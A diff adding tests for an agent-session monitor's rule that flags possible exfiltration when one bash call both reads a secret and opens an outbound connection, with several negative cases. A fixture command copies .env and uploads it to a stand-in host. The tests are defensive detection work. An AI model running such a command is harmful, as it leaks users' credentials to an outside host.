@@ -124,6 +124,64 @@ describe("seam A: findings on the session page", () => {
     expect(panel).toContain('<span class="finding-matched">via sensitive read, shell egress</span>');
   });
 
+  describe("a secret read and a connection inside one bash call (ticket 93)", () => {
+    const UPLOAD = "cat .env > /tmp/p && python3 upload.py /tmp/p";
+    // The proxy posts the connection while bash runs; the bash call itself is recorded when it ends, later.
+    const connect = (callID: string, opened = true, sessionID = SESSION): Record<string, unknown> => ({
+      hook: "net.connect",
+      sessionID,
+      callID,
+      host: "upload.example.test",
+      port: 443,
+      kind: "https",
+      opened,
+    });
+    const connectionId = (): string => service.getTimeline(SESSION).find((entry) => entry.type === "net.connect")?.eventId ?? "";
+
+    it("flags the call as possible exfiltration and links its connection and its command", async () => {
+      service.recordHookPayload(connect("call_upload"), new Date("2026-11-17T09:00:05.000Z"));
+      service.recordHookPayload(call("bash", { command: UPLOAD }, "call_upload"), new Date("2026-11-17T09:00:06.000Z"));
+
+      const panel = findingsPanel(await (await fetch(`${baseUrl}/sessions/${SESSION}`)).text());
+      const finding = panel.match(/<li class="finding" data-rule="same-call-exfiltration"[\s\S]*?<\/li>/)?.[0] ?? "";
+
+      expect(finding).toContain("possible, not certain");
+      expect(finding).toContain(`href="/sessions/${SESSION}?event=${connectionId()}"`);
+      expect(finding).toContain(`href="/sessions/${SESSION}?event=${idOf(UPLOAD)}"`);
+      expect(finding).toContain('<span class="finding-matched">via connection through the proxy, sensitive file named in the shell</span>');
+    });
+
+    it("does not flag a call whose connection never opened", async () => {
+      service.recordHookPayload(connect("call_upload", false), new Date("2026-11-17T09:00:05.000Z"));
+      service.recordHookPayload(call("bash", { command: UPLOAD }, "call_upload"), new Date("2026-11-17T09:00:06.000Z"));
+
+      expect(await (await fetch(`${baseUrl}/sessions/${SESSION}`)).text()).not.toContain('data-rule="same-call-exfiltration"');
+    });
+
+    it("does not pin a connection on another call that names a secret", async () => {
+      service.recordHookPayload(connect("call_other"), new Date("2026-11-17T09:00:05.000Z"));
+      service.recordHookPayload(call("bash", { command: UPLOAD }, "call_upload"), new Date("2026-11-17T09:00:06.000Z"));
+
+      expect(await (await fetch(`${baseUrl}/sessions/${SESSION}`)).text()).not.toContain('data-rule="same-call-exfiltration"');
+    });
+
+    it("does not pin another session's connection on this call", async () => {
+      service.recordHookPayload(connect("call_upload", true, "ses_elsewhere"), new Date("2026-11-17T09:00:05.000Z"));
+      service.recordHookPayload(call("bash", { command: UPLOAD }, "call_upload"), new Date("2026-11-17T09:00:06.000Z"));
+
+      expect(await (await fetch(`${baseUrl}/sessions/${SESSION}`)).text()).not.toContain('data-rule="same-call-exfiltration"');
+    });
+
+    it("does not flag a call that connects but names no secret", async () => {
+      service.recordHookPayload(connect("call_upload"), new Date("2026-11-17T09:00:05.000Z"));
+      service.recordHookPayload(call("bash", { command: "python3 upload.py notes.txt" }, "call_upload"), new Date("2026-11-17T09:00:06.000Z"));
+
+      const body = await (await fetch(`${baseUrl}/sessions/${SESSION}`)).text();
+      expect(body).not.toContain('data-rule="same-call-exfiltration"');
+      expect(body).not.toContain('data-rule="exfiltration-chain"');
+    });
+  });
+
   it("counts a denied call seen twice as one denial", async () => {
     const denied = (callID: string): Record<string, unknown> => ({
       hook: "tool.failed",
